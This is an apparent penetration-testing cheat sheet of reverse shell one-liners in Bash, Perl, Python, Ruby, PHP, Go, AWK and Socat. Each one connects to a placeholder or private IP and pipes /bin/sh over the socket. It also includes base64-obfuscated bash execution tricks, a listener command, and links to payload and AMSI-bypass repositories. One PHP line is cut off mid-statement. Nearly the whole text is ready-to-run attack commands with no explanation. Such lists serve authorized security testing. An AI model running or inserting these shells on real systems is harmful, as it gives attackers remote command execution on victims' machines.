# Reverse Shells

\# Bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 172.21.0.0 1234 &gt;/tmp/f

nc -e /bin/sh 10.11.1.111 4443

bash -i &gt;& /dev/tcp/IP ADDRESS/8080 0&gt;&1

​

\# Bash B64 Ofuscated

{echo,COMMAND\_BASE64}\|{base64,-d}\|bash 

echo${IFS}COMMAND\_BASE64\|base64${IFS}-d\|bash

bash -c {echo,COMMAND\_BASE64}\|{base64,-d}\|{bash,-i}

echo COMMAND\_BASE64 \| base64 -d \| bash

​

\# Perl

perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket\(S,PF\_INET,SOCK\_STREAM,getprotobyname\("tcp"\)\);if\(connect\(S,sockaddr\_in\($p,inet\_aton\($i\)\)\)\){open\(STDIN,"&gt;&S"\);open\(STDOUT,"&gt;&S"\);open\(STDERR,"&gt;&S"\);exec\("/bin/sh -i"\);};'

​

\# Python

python -c 'import socket,subprocess,os;s=socket.socket\(socket.AF\_INET,socket.SOCK\_STREAM\);s.connect\(\("IP ADDRESS",PORT\)\);os.dup2\(s.fileno\(\),0\); os.dup2\(s.fileno\(\),1\); os.dup2\(s.fileno\(\),2\);p=subprocess.call\(\["/bin/sh","-i"\]\);'

python -c '\_\_import\_\_\('os'\).system\('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 10.10.14.9 4433 &gt;/tmp/f'\)-1\'

​

\# Python IPv6

python -c 'import socket,subprocess,os,pty;s=socket.socket\(socket.AF\_INET6,socket.SOCK\_STREAM\);s.connect\(\("dead:beef:2::125c",4343,0,2\)\);os.dup2\(s.fileno\(\),0\); os.dup2\(s.fileno\(\),1\); os.dup2\(s.fileno\(\),2\);p=pty.spawn\("/bin/sh"\);'

​

\# Ruby

ruby -rsocket -e'f=TCPSocket.open\("IP ADDRESS",1234\).to\_i;exec sprintf\("/bin/sh -i &lt;&%d &gt;&%d 2&gt;&%d",f,f,f\)'

ruby -rsocket -e 'exit if fork;c=TCPSocket.new\("\[IPADDR\]","\[PORT\]"\);while\(cmd=c.gets\);IO.popen\(cmd,"r"\){\|io\|c.print io.read}end'

​

\# PHP:

\# /usr/share/webshells/php/php-reverse-shell.php

\# http://pentestmonkey.net/tools/web-shells/php-reverse-shell

php -r '$sock=fsockopen\("IP ADDRESS",1234\);exec\("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3"\);'

$sock, 1=&gt;$sock, 2=&gt;$sock\), $pipes\);?&gt;

​

\# Golang

echo 'package main;import"os/exec";import"net";func main\(\){c,\_:=net.Dial\("tcp","IP ADDRESS:8080"\);cmd:=exec.Command\("/bin/sh"\);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run\(\)}' &gt; /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

​

\# AWK

awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while\(42\) { do{ printf "shell&gt;" \|& s; s \|& getline c; if\(c\){ while \(\(c \|& getline\) &gt; 0\) print $0 \|& s; close\(c\); } } while\(c != "exit"\) close\(s\); }}' /dev/null

​

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

​

\# Socat

socat TCP4:10.10.10.10:443 EXEC:/bin/bash

\# Socat listener

socat -d -d TCP4-LISTEN:443 STDOUT

